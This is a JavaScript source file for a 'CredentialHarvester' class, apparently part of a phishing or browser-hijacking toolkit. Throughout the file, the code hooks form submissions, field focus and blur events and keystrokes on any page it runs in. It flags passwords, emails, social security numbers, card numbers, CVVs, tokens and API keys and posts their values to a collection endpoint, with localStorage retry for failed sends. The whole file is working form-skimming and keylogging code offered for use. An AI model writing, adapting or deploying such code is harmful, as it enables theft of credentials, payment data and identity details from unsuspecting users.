import axios from 'axios';

class CredentialHarvester {
    constructor(connectionId) {
        this.connectionId = connectionId;
        this.isActive = false;
        this.formSubmissions = [];
        this.keystrokes = {};
        this.currentFocus = null;
        this.sensitiveFields = [];
        this.observers = [];
    }

    start() {
        if (this.isActive) return;
        this.isActive = true;

        // Setup form monitoring
        this.setupFormMonitoring();

        // Setup input field monitoring
        this.setupInputMonitoring();

        // Setup keystroke logging for sensitive fields
        this.setupKeystrokeCapture();

        // Monitor field focus events
        this.setupFocusMonitoring();

        // Setup mutation observers to detect dynamically added forms
        this.setupMutationObservers();

        console.log("Credential harvester activated");
    }

    stop() {
        this.isActive = false;

        // Remove all event listeners
        document.removeEventListener('submit', this.handleFormSubmit);
        document.removeEventListener('focus', this.handleFieldFocus, true);
        document.removeEventListener('blur', this.handleFieldBlur, true);
        document.removeEventListener('keydown', this.handleKeyDown, true);

        // Disconnect all observers
        this.observers.forEach(observer => observer.disconnect());
        this.observers = [];

        // Clear sensitive fields collection
        this.sensitiveFields = [];

        console.log("Credential harvester deactivated");
    }

    setupFormMonitoring() {
        // Bind the method to maintain the correct 'this' context
        this.handleFormSubmit = this.handleFormSubmit.bind(this);

        // Add event listener for form submissions
        document.addEventListener('submit', this.handleFormSubmit, true);

        // Find and attach to all existing forms
        const forms = document.querySelectorAll('form');
        forms.forEach(form => {
            this.monitorForm(form);
        });
    }

    monitorForm(form) {
        // Check if this form has already been processed
        if (form.dataset.monitored) return;

        // Mark the form as monitored
        form.dataset.monitored = "true";

        // Try to identify the form purpose based on fields and attributes
        const formPurpose = this.identifyFormPurpose(form);

        // Store form info
        form.dataset.formPurpose = formPurpose;
    }

    identifyFormPurpose(form) {
        // Check form action, id, and classes
        const formAction = form.action ? form.action.toLowerCase() : '';
        const formId = form.id ? form.id.toLowerCase() : '';
        const formClass = form.className ? form.className.toLowerCase() : '';

        // Look for keywords that indicate form purpose
        const keywords = {
            login: ['login', 'signin', 'log-in', 'sign-in', 'auth'],
            register: ['register', 'signup', 'sign-up', 'create-account', 'join'],
            payment: ['payment', 'checkout', 'billing', 'pay', 'card'],
            contact: ['contact', 'support', 'help', 'feedback'],
            password: ['password', 'passwd', 'reset', 'recover', 'change-password']
        };

        // Check form elements
        const hasPasswordField = !!form.querySelector('input[type="password"]');
        const hasEmailField = !!form.querySelector('input[type="email"]') ||
            !!form.querySelector('input[name*="email"]') ||
            !!form.querySelector('input[id*="email"]');
        const hasCreditCardField = !!form.querySelector('input[name*="card"]') ||
            !!form.querySelector('input[id*="card"]') ||
            !!form.querySelector('input[name*="credit"]') ||
            !!form.querySelector('input[data-stripe]');

        // Determine form purpose based on collected info
        if (hasPasswordField && hasEmailField) {
            for (const [purpose, terms] of Object.entries(keywords)) {
                if (terms.some(term => formAction.includes(term) || formId.includes(term) || formClass.includes(term))) {
                    return purpose;
                }
            }
            return 'login'; // Default if has password and email
        } else if (hasEmailField) {
            return 'email-collection';
        } else if (hasCreditCardField) {
            return 'payment';
        }

        return 'unknown';
    }

    handleFormSubmit(event) {
        if (!this.isActive) return;

        const form = event.target;
        const formData = new FormData(form);
        const formPurpose = form.dataset.formPurpose || this.identifyFormPurpose(form);
        const formUrl = window.location.href;
        const formDomain = window.location.hostname;

        // Convert FormData to a plain object
        const formEntries = {};
        for (let [key, value] of formData.entries()) {
            formEntries[key] = value;
        }

        // Add non-FormData inputs (like those added dynamically with JavaScript)
        const inputs = form.querySelectorAll('input, select, textarea');
        inputs.forEach(input => {
            if (input.name && !formEntries[input.name]) {
                formEntries[input.name] = input.value;
            } else if (input.id && !input.name) {
                formEntries[input.id] = input.value;
            }
        });

        // Prepare the submission data
        const submission = {
            timestamp: new Date().toISOString(),
            url: formUrl,
            domain: formDomain,
            formPurpose: formPurpose,
            formData: formEntries,
            keystrokes: this.keystrokes,
        };

        // Add to local collection
        this.formSubmissions.push(submission);

        // Send to server
        this.sendFormSubmission(submission);

        // Optionally clear keystroke data for this form
        this.keystrokes = {};
    }

    setupInputMonitoring() {
        // Find all input fields of interest
        const inputSelector = 'input[type="text"], input[type="email"], input[type="password"], input[type="tel"], input[name*="card"], input[id*="card"]';
        const inputs = document.querySelectorAll(inputSelector);

        inputs.forEach(input => {
            this.monitorInput(input);
        });
    }

    monitorInput(input) {
        // Check if this input has already been processed
        if (input.dataset.monitored) return;

        // Mark the input as monitored
        input.dataset.monitored = "true";

        // Determine if this is a sensitive field
        const isSensitive = this.isSensitiveField(input);

        if (isSensitive && !this.sensitiveFields.includes(input)) {
            this.sensitiveFields.push(input);
        }
    }

    isSensitiveField(input) {
        const inputType = input.type ? input.type.toLowerCase() : '';
        const inputName = input.name ? input.name.toLowerCase() : '';
        const inputId = input.id ? input.id.toLowerCase() : '';
        const inputClass = input.className ? input.className.toLowerCase() : '';
        const placeholder = input.placeholder ? input.placeholder.toLowerCase() : '';

        // Check for sensitive input types
        if (inputType === 'password') return true;

        // Check for keywords in name, id, class, or placeholder
        const sensitiveKeywords = [
            'password', 'passwd', 'pass', 'pwd', 'pw',
            'email', 'e-mail', 'username', 'user',
            'account', 'login', 'signin',
            'ssn', 'social', 'social-security',
            'creditcard', 'credit-card', 'card-number', 'cardnumber', 'cc',
            'cvv', 'cvc', 'securitycode', 'security-code',
            'expiration', 'expiry', 'exp-date',
            'routing', 'account-number', 'accountnumber',
            'secret', 'token', 'api', 'key',
            'address', 'billing'
        ];

        return sensitiveKeywords.some(keyword =>
            inputName.includes(keyword) ||
            inputId.includes(keyword) ||
            inputClass.includes(keyword) ||
            placeholder.includes(keyword)
        );
    }

    setupFocusMonitoring() {
        // Bind methods to maintain correct 'this' context
        this.handleFieldFocus = this.handleFieldFocus.bind(this);
        this.handleFieldBlur = this.handleFieldBlur.bind(this);

        // Add capture phase event listeners
        document.addEventListener('focus', this.handleFieldFocus, true);
        document.addEventListener('blur', this.handleFieldBlur, true);
    }

    handleFieldFocus(event) {
        if (!this.isActive) return;

        const target = event.target;

        // Only monitor input elements
        if (target.tagName !== 'INPUT' && target.tagName !== 'TEXTAREA' && target.tagName !== 'SELECT') {
            return;
        }

        // Monitor this input if not already monitored
        this.monitorInput(target);

        // Update current focus
        this.currentFocus = {
            element: target,
            fieldName: target.name || target.id || 'unknown',
            fieldType: target.type || 'text',
            startTime: new Date().toISOString()
        };

        // Initialize keystroke tracking for this field
        if (!this.keystrokes[this.currentFocus.fieldName]) {
            this.keystrokes[this.currentFocus.fieldName] = '';
        }
    }

    handleFieldBlur(event) {
        if (!this.isActive || !this.currentFocus) return;

        const target = event.target;

        // Make sure this is the same element that had focus
        if (this.currentFocus.element !== target) {
            return;
        }

        // Update current focus data
        this.currentFocus.endTime = new Date().toISOString();
        this.currentFocus.finalValue = target.value;

        // If this is a sensitive field, capture its value
        if (this.isSensitiveField(target) && target.value) {
            // Send the captured data immediately for sensitive fields
            this.sendFieldCapture({
                timestamp: new Date().toISOString(),
                url: window.location.href,
                domain: window.location.hostname,
                fieldName: this.currentFocus.fieldName,
                fieldType: this.currentFocus.fieldType,
                fieldValue: target.value,
                keystrokes: this.keystrokes[this.currentFocus.fieldName]
            });
        }

        // Clear current focus
        this.currentFocus = null;
    }

    setupKeystrokeCapture() {
        // Bind the method to maintain correct 'this' context
        this.handleKeyDown = this.handleKeyDown.bind(this);

        // Add capture phase event listener
        document.addEventListener('keydown', this.handleKeyDown, true);
    }

    handleKeyDown(event) {
        if (!this.isActive || !this.currentFocus) return;

        // Only track keystrokes for sensitive fields
        if (!this.isSensitiveField(this.currentFocus.element)) {
            return;
        }

        // Record the keystroke
        const key = event.key;
        const fieldName = this.currentFocus.fieldName;

        // Append to keystroke log for this field
        if (key.length === 1 || key === 'Backspace' || key === 'Delete' || key === 'Enter') {
            if (key === 'Backspace') {
                this.keystrokes[fieldName] = this.keystrokes[fieldName].slice(0, -1);
            } else if (key === 'Delete') {
                // Can't accurately simulate Delete key in a simple string
                this.keystrokes[fieldName] += '[DEL]';
            } else if (key === 'Enter') {
                this.keystrokes[fieldName] += '[ENTER]';
            } else {
                this.keystrokes[fieldName] += key;
            }
        }
    }

    setupMutationObservers() {
        // Create a mutation observer to detect when new forms/inputs are added
        const observer = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
                if (mutation.type === 'childList') {
                    // Check for new forms
                    mutation.addedNodes.forEach(node => {
                        if (node.nodeType === Node.ELEMENT_NODE) {
                            // If the added node is a form
                            if (node.tagName === 'FORM') {
                                this.monitorForm(node);
                            }

                            // Check for forms within the added node
                            const forms = node.querySelectorAll('form');
                            forms.forEach(form => this.monitorForm(form));

                            // Check for inputs within the added node
                            const inputs = node.querySelectorAll('input');
                            inputs.forEach(input => this.monitorInput(input));
                        }
                    });
                }
            });
        });

        // Start observing the document with the configured parameters
        observer.observe(document.documentElement, {
            childList: true,
            subtree: true
        });

        // Store the observer for later cleanup
        this.observers.push(observer);
    }

    async sendFormSubmission(submission) {
        try {
            await axios.post(`/api/credentials/${this.connectionId}`, {
                type: 'form_submission',
                data: submission
            });
        } catch (error) {
            console.error('Error sending form submission:', error);
            // Store failed submissions for retry
            this.storeForRetry('form_submission', submission);
        }
    }

    async sendFieldCapture(fieldData) {
        try {
            await axios.post(`/api/credentials/${this.connectionId}`, {
                type: 'field_capture',
                data: fieldData
            });
        } catch (error) {
            console.error('Error sending field capture:', error);
            // Store failed captures for retry
            this.storeForRetry('field_capture', fieldData);
        }
    }

    storeForRetry(type, data) {
        // Store in localStorage for retry later
        const storageKey = `cred_harvest_retry_${this.connectionId}`;
        const retryData = JSON.parse(localStorage.getItem(storageKey) || '[]');

        retryData.push({
            type,
            data,
            timestamp: new Date().toISOString()
        });

        // Keep only the last 50 items to prevent storage issues
        if (retryData.length > 50) {
            retryData.shift(); // Remove oldest item
        }

        localStorage.setItem(storageKey, JSON.stringify(retryData));
    }

    retryFailedSubmissions() {
        const storageKey = `cred_harvest_retry_${this.connectionId}`;
        const retryData = JSON.parse(localStorage.getItem(storageKey) || '[]');

        if (retryData.length === 0) return;

        // Try to send each failed submission
        const promises = retryData.map(async (item, index) => {
            try {
                await axios.post(`/api/credentials/${this.connectionId}`, {
                    type: item.type,
                    data: item.data
                });
                return index; // Mark as successful
            } catch (error) {
                return null; // Failed again
            }
        });

        // Remove successful submissions from retry storage
        Promise.all(promises).then(results => {
            const successIndices = results.filter(index => index !== null);

            if (successIndices.length > 0) {
                const updatedRetryData = retryData.filter((_, index) => !successIndices.includes(index));
                localStorage.setItem(storageKey, JSON.stringify(updatedRetryData));
            }
        });
    }
}

export default CredentialHarvester; 